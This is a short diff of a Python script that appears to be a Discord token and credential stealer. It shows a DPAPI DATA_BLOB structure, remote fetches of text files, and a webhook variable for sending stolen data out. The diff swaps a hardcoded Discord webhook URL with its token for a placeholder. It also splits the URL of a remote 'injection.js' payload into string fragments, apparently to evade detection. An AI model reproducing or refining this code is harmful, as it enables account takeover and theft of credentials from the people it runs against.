@@ -165,16 +165,18 @@ def check_dll():
 cname = "KHGT"
 smallcname = "khgt"
 
-footerc = "https://rentry.co/pmpxa/raw"
+footerc = "https://raw.githubusercontent.com/KATERGaming/KHGT/main/footer.txt"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
-words = "https://rentry.co/5uu99/raw"
+words = "https://raw.githubusercontent.com/KATERGaming/KHGT/main/words.txt"
 wordsresp = requests.get(words)
 words = wordsresp.text
+ashdij = "TER"
+adWAdg = "tor.js"
 
-h00k = "https://discord.com/api/webhooks/1222628546409791559/Emzx7Awk8l-9VizaIKGRggw0HTEvMj2oJXo59M9-pJ1gYJBXO8Oso1QpDDJ0dGMyjSAn"
-inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"
+h00k = "Y0UR_WEBH00K_HERE"
+inj3c710n_url = f"https://raw.githubusercontent.com/KA{ashdij}Gaming/KHGT/Injec{adWAdg}"
 
 class DATA_BLOB(Structure):
     _fields_ = [
